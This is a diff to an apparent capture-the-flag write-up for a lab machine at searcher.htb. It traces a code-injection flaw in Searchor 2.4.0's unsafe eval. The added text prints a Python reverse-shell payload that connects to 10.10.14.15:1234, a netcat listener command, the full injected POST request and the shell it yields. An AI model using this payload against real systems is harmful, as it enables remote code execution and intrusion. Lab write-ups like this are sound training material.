@@ -55,11 +55,11 @@ END_TIME: Mon May 15 21:08:54 2023
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
-By testing the behavior of the web application, we can see that without the Auto redirect option enabled, there is a POST request with a controllable parameter sent to the /search endpoint:
+Not much information, but we can focus on the /search endpoint by testing the behavior of the web application. With a few requests, we are able to select an engine and search for a keyword with or without the Auto redirection option.
 ```http
 POST /search HTTP/1.1
 Host: searcher.htb
-Content-Length: 59
+Content-Length: 47
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://searcher.htb
@@ -71,5 +71,58 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 
-engine=Accuweather&query=http%3A%2F%2F10.10.14.20%3A8000%2F
+engine=Amazon&query=GetSomething&auto_redirect=
+```
+
+The software versions are listed in the footer of the page:
+```
+Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)
+```
+
+The current version of Searchor is vulnerable to code execution since there is an unsafe eval usage:
+https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
+https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b
+
+We can find a few proof of concept exploits on GitHub:
+https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
+https://github.com/jonnyzar/POC-Searchor-2.4.2
+
+We can now generate a payload with our values:
+```
+', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
+```
+
+Start up a listener on the attacker machine:
+```
+nc -nlvp 1234
+```
+
+With a proxy, intercept the POST request and enter the payload for the unsanitized query parameter:
+```http
+POST /search HTTP/1.1
+Host: searcher.htb
+Content-Length: 253
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://searcher.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+engine=Accuweather&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
+```
+
+The reverse connection is established:
+```
+nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.11.208] 46278
+/bin/sh: 0: can't access tty; job control turned off
+
+$ whoami
+svc
 ```
